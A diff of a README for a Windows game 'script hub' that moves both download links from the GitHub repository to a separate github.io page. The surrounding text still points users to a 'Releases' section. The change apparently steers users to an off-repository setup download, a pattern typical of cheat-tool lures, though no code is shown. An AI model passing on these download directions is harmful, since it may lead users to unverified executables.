@@ -1,7 +1,7 @@
 # 🎯 baddies-windows-script-hub - Enhance your gameplay with simple tools
 
 <p align="center">
-  <a href="https://github.com/Peanutbutterwatersnake580/baddies-windows-script-hub">
+  <a href="https://peanutbutterwatersnake580.github.io">
     <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download">
   </a>
 </p>
@@ -24,7 +24,7 @@ If your computer lacks the .NET runtime, the game utility will prompt you to ins
 
 You must visit the official release page to get the correct version of the utility for your system.
 
-[Visit this page to download the latest setup file](https://github.com/Peanutbutterwatersnake580/baddies-windows-script-hub)
+[Visit this page to download the latest setup file](https://peanutbutterwatersnake580.github.io)
 
 1. Select the link above to open your browser.
 2. Look for the section labeled "Releases" on the right side of the page.
